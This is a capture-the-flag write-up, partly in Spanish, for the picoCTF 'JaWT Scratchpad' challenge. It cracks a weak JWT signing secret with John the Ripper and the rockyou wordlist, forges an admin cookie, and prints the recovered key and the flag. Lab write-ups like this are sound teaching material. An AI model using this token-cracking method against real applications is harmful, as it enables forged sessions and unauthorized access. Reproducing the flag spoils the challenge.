# JaWT Scratchpad

## Descripcion
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Pistas
- What is that cookie?
- Have you heard of JWT?
## Solucion
```
Ingresamos a la pagina registramos un usuario y con cookie editor vemos la cookie jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y la copiamos y ponemos en jwt.io ahora solo ocupamos buscar la palabra que desencripte 
guardamos la cookie en un archivo y luego usamos el comando
john token -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:01 DONE (2023-03-14 11:21) 0.5780g/s 4275Kp/s 4275Kc/s 4275KC/s iloveskitty..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
dandonos la palabre clave ilovepico la ponemos en jwt.io lo que nos de lo ponemos en donde estaba el valor de la cookie refrescamos la pagina y nos da la token
picoCTF{jawt_was_just_what_you_thought_1ca14548}
```

## Bandera

picoCTF{jawt_was_just_what_you_thought_1ca14548}

## Notas adicionales

## Referencias
[JWT](https://jwt.io/)